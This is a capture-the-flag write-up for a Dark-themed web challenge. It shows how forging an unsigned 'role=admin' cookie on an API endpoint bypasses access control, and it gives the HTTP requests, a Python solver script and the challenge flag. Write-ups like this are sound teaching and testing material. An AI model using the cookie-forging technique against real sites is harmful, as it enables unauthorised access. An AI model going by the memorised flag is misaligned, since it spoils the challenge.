# CTF Writeup — The Knot (Winden Time Machine)

**Challenge URL:** https://winden-ctf.vercel.app/  
**Category:** Web  
**Flag:** `CrackOn{Never_Ending_Circle}`

---

## Description

> "The beginning is the end, and the end is the beginning."
>
> Deep beneath Winden, a time machine has been discovered inside the caves of Sic Mundus. Scientists have built a web terminal to control it — but access is restricted.
>
> You have been granted basic access to the terminal. But the classified temporal data lies beyond your clearance.
>
> The machine knows who you are. Can you make it believe otherwise?

---

## Reconnaissance

Opening the challenge page presents a stylised retro terminal themed around the TV show **Dark** (Netflix). There's a single **ACTIVATE** button that triggers a JavaScript function when clicked.

### Step 1 — Read the Page Source

Inspecting the HTML source reveals the core JavaScript logic:

```js
// Obfuscated endpoint — base64 encoded + split
// /api/metrics
const _e = atob(['L2FwaS', '9tZXRyaWNz'].join(''));

async function init() {
  const _r = await fetch(_e, { credentials: 'include' });
  const _d = await _r.json();

  // Check purely based on flag format — no admin field
  const _isReal = _d.flag && !_d.flag.includes('wr0ng') &&
                  !_d.flag.includes('n0t_y3t') &&
                  !_d.flag.includes('nowh3r3') &&
                  !_d.flag.includes('try_4ga1n') &&
                  !_d.flag.includes('f4k3');
  ...
}
```

Key findings:
- The API endpoint is **`/api/metrics`** (the base64 strings decode to `/api/metrics`)
- `credentials: 'include'` means cookies are sent with the request
- The client-side code checks whether the returned flag contains decoy strings to decide if it's "real"

### Step 2 — Probe the API Directly

Calling `/api/metrics` without any special cookies:

```
GET /api/metrics HTTP/1.1
Host: winden-ctf.vercel.app
```

**Response:**
```json
{"status":"ok","message":"Sequence initiated.","flag":"CrackOn{th3_cav3_l3ads_nowh3r3_2019}"}
```

The response also sets a cookie:
```
Set-Cookie: role=guest; Path=/; SameSite=Lax
```

The flag contains `nowh3r3` — a decoy. The server assigns the visitor a **`role=guest`** cookie and returns a fake flag.

---

## Vulnerability

**Broken Access Control / Client-Controlled Identity (OWASP A01)**

The server reads the `role` value directly from the request cookie sent by the client — **without any signature, session binding, or server-side validation**. This means anyone can forge an arbitrary role by simply setting the cookie themselves.

The hint — *"The machine knows who you are. Can you make it believe otherwise?"* — points directly to this: spoof your identity by changing the cookie.

---

## Exploitation

Send the request with `Cookie: role=admin`:

```
GET /api/metrics HTTP/1.1
Host: winden-ctf.vercel.app
Cookie: role=admin
```

**Response:**
```json
{"status":"ok","message":"Temporal sequence complete.","flag":"CrackOn{Never_Ending_Circle}"}
```

The flag does **not** contain any of the decoy substrings — it's the real one.

---

## Solver Script

```python
import urllib.request
import json

TARGET = "https://winden-ctf.vercel.app/api/metrics"

req = urllib.request.Request(TARGET)
req.add_header("User-Agent", "Mozilla/5.0")
req.add_header("Cookie", "role=admin")

response = urllib.request.urlopen(req)
data = json.loads(response.read().decode("utf-8"))

print(f"[FLAG] {data['flag']}")
```

**Output:**
```
[FLAG] CrackOn{Never_Ending_Circle}
```

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Read page source | Found `/api/metrics` endpoint and cookie-based role check |
| 2 | Call API as guest | Received decoy flag, `role=guest` cookie set by server |
| 3 | Resend with `role=admin` cookie | Server trusted the client-supplied cookie and returned real flag |

**Root Cause:** The server uses a plain, unsigned cookie value to determine user privilege level. There is no JWT, HMAC signature, or session validation — the client fully controls its own identity.

---

## Flag

```
CrackOn{Never_Ending_Circle}
```
